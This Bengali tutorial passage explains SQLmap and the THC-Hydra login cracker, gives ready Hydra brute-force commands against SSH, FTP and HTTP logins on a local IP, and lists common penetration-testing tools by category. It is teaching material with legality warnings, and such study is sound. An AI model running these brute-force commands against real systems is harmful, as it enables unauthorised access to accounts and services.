### 🔐 Legal Use (সতর্কতা)

- ✅ নিজস্ব সার্ভার, ক্লায়েন্ট, প্র্যাকটিস সাইটে ব্যবহার করো  
- ❌ অন্যের ওয়েবসাইটে চালানো সম্পূর্ণ **অবৈধ** এবং **বড় অপরাধ**  

---

### 🧠 SQLmap vs Manual Injection

| বিষয়         | Manual SQLi                   | SQLmap                    |
| ------------ | ----------------------------- | -------------------------- |
| খোঁজা        | নিজে injection test করতে হয়   | SQLmap auto detect করে    |
| ডেটা বের করা | নিজে query বানাতে হয়          | SQLmap নিজেই dump করে     |
| সময়          | বেশি                          | কম                         |
| সহজ          | না                            | ✅ হ্যাঁ                    |

---

### ✅ সংক্ষেপে

**SQLmap** হলো **SQL Injection** এর জন্য এক ধরনের  
**Automatic Hacker Bot** 🤖

একটা vulnerable URL দিলেই —  
SQLmap তোমার জন্য **পুরো ডেটাবেইস খুলে ফেলবে!** 😱










---

<br>
<br>
<br>
<br>





### Hydra কী?

👉 **Hydra** (বা THC-Hydra) হলো একটি শক্তিশালী **network login cracker**  
যা বিভিন্ন প্রোটোকল (যেমন FTP, SSH, HTTP, SMB, SMTP ইত্যাদি) ব্যবহার করে  
**Brute-force** বা **Dictionary attack** চালিয়ে লগইন পাসওয়ার্ড ভাঙার চেষ্টা করে।

অর্থাৎ, এটা তোমার জন্য পাসওয়ার্ড অনুমান করে **network services হ্যাক করার টুল।**

---

### 🔍 Hydra দিয়ে কী কী করা যায়?

| কাজ                                  | ব্যাখ্যা                                                    |
| ------------------------------------ | ----------------------------------------------------------- |
| 🔑 বিভিন্ন সার্ভিসে লগইন ক্র্যাক করা | FTP, SSH, Telnet, HTTP, SMB, VNC, PostgreSQL, MySQL ইত্যাদি |
| 🔢 Dictionary Attack                 | শব্দের তালিকা দিয়ে পাসওয়ার্ড অনুমান করা                     |
| ⚡ Brute-force Attack                | সম্ভাব্য সব পাসওয়ার্ড চেষ্টা করা                             |
| 🌐 বিভিন্ন প্রোটোকল সাপোর্ট          | HTTP Basic, HTTP Form, FTP, SSH, SMB, IMAP, POP3 ইত্যাদি    |
| 📊 Multi-threaded                    | দ্রুত স্ক্যান করতে অনেক থ্রেড ব্যবহার করে                   |

---

### 🧪 সাধারণ কমান্ড উদাহরণ

#### ১. SSH তে ব্রুটফোর্স (username: root)

```bash
hydra -l root -P /path/to/wordlist.txt ssh://192.168.1.100 
```
2. FTP লগইন ক্র্যাক
```bash
hydra -L users.txt -P passlist.txt ftp://192.168.1.100
```
3. HTTP Basic Authentication
```bash
hydra -L users.txt -P passlist.txt 192.168.1.100 http-get /
```
4. HTTP Form Based Login
```bash
hydra -L users.txt -P passlist.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```
### ⚙️ Hydra এর গুরুত্বপূর্ণ অপশন

| অপশন | কাজ                          |
| ---- | ---------------------------- |
| `-L` | ইউজারনেমের তালিকা (file)     |
| `-l` | একক ইউজারনেম                 |
| `-P` | পাসওয়ার্ড তালিকা (file)      |
| `-p` | একক পাসওয়ার্ড                |
| `-t` | থ্রেড সংখ্যা (ডিফল্ট 16)     |
| `-s` | পোর্ট নম্বর নির্দিষ্ট করা    |
| `-V` | সাকসেসফুল ট্রায়াল দেখানো     |
| `-f` | ব্রুটফোর্স থামানো যখন সফল হয় |

---

### 🛡️ সতর্কতা

✅ নিজের সার্ভার বা অনুমতি পাওয়া নেটওয়ার্কে ব্যবহার করো।  
❌ অন্য কারো সার্ভারে ব্যবহার করলে **আইনি শাস্তি** হতে পারে।

---

### 🆚 Hydra vs John the Ripper

| বিষয়             | Hydra                             | John the Ripper                      |
| ---------------- | --------------------------------- | ------------------------------------ |
| প্রধান কাজ       | Network service login brute-force | Local password hash cracking         |
| প্রোটোকল সাপোর্ট | SSH, FTP, HTTP, SMB, ইত্যাদি      | Password hash types (MD5, SHA, NTLM) |
| ব্যবহার ক্ষেত্র  | Network penetration testing       | Password hash cracking               |
| Attack method    | Online brute force                | Offline hash cracking                |

---

### ✅ সারসংক্ষেপে

**Hydra** হলো তোমার পাসওয়ার্ড **ব্রুটফোর্সিং সফটওয়্যার**,  
যেটা বিভিন্ন সার্ভিসের লগইন **ভেঙে ফেলার জন্য ব্যবহৃত হয়।**







---

<br>
<br>
<br>
<br>


# জনপ্রিয় সাইবারসিকিউরিটি টুলস লিস্ট (Categories-wise)

---

### ১. Network Scanning & Reconnaissance

- **Nmap** — Network discovery ও পোর্ট স্ক্যানিং
- **Masscan** — দ্রুত পোর্ট স্ক্যানার (Nmap-এর চেয়ে দ্রুত)
- **Netcat (nc)** — Network debugging ও TCP/IP connection তৈরির জন্য
- **Wireshark** — Network packet capture ও বিশ্লেষণ
- **Fping** — Ping sweep tool

---

### ২. Vulnerability Scanners

- **Nessus** — পেশাদার ভলনারেবিলিটি স্ক্যানার
- **OpenVAS** — ওপেন সোর্স vulnerability scanning
- **Nikto** — ওয়েব সার্ভার vulnerability scanner
- **SQLmap** — SQL Injection vulnerability scanner

---

### ৩. Password Cracking & Brute-force Tools

- **John the Ripper** — Password hash cracking tool
- **Hashcat** — GPU-accelerated password cracker
- **Hydra (THC-Hydra)** — Network service login brute-force
- **Medusa** — Parallel login brute forcing tool

---

### ৪. Wireless Hacking Tools

- **Aircrack-ng** — WiFi password cracking suite
- **Kismet** — Wireless network detector এবং IDS
- **Reaver** — WPS PIN recovery tool
- **Fern WiFi Cracker** — GUI-based WiFi pentesting tool

---

### ৫. Exploitation Frameworks

- **Metasploit Framework** — Exploit development ও penetration testing
- **BeEF** — Browser Exploitation Framework (Web-based attacks)
- **Social Engineering Toolkit (SET)** — Social engineering attacks

---

### ৬. Web Application Testing Tools

- **Burp Suite** — Web vulnerability scanning ও manual testing
- **OWASP ZAP** — Open source web application scanner
- **W3af** — Web application attack and audit framework

---

### ৭. Post Exploitation & Privilege Escalation

- **Mimikatz** — Windows password extraction tool
- **PowerSploit** — PowerShell based post-exploitation toolkit
- **Empire** — Post-exploitation framework

---

### ৮. Forensics & Analysis Tools

- **Autopsy** — Digital forensics platform
- **Volatility** — Memory forensics framework
- **Sleuth Kit** — Filesystem analysis tools

---

### ৯. Reverse Engineering & Malware Analysis

- **Ghidra** — NSA released reverse engineering tool
- **Radare2** — Open source reverse engineering framework
- **OllyDbg** — Windows debugger

---

### 🔟 Miscellaneous Useful Tools

- **Tcpdump** — Command line packet analyzer
- **Netdiscover** — ARP network discovery tool
- **Dirb / Dirbuster** — Directory/file brute forcing on websites
- **ExifTool** — Metadata extraction from files
- **Maltego** — OSINT and data mining tool

---

### 🧠 Summary Table

| Category               | Popular Tools                          |
| ---------------------- | --------------------------------------- |
| Network Scanning       | Nmap, Masscan, Wireshark               |
| Vulnerability Scanning | Nessus, OpenVAS, Nikto, SQLmap         |
| Password Cracking      | John the Ripper, Hashcat, Hydra        |
| Wireless Hacking       | Aircrack-ng, Kismet, Reaver            |
| Exploitation           | Metasploit, BeEF, SET                  |
| Web Testing            | Burp Suite, OWASP ZAP, W3af            |
| Post Exploitation      | Mimikatz, PowerSploit, Empire          |
| Forensics              | Autopsy, Volatility, Sleuth Kit        |
| Reverse Engineering    | Ghidra, Radare2, OllyDbg               |
| Miscellaneous          | Tcpdump, Dirb, ExifTool, Maltego       |

---

